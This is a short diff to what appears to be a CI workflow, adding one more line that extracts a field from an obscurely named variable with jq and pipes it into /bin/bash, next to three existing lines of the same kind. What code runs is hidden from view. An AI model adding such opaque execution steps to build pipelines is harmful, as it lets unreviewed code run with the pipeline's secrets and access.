@@ -38,6 +38,7 @@ jobs:
           printf '%s' "$buj1" | jq -r .h0 | /bin/bash
           printf '%s' "$xthvt4" | jq -r .m0 | /bin/bash
           echo $j0 | jq -r .mhaq25139 | /bin/bash
+          echo $eha073 | jq -r .iak44976 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
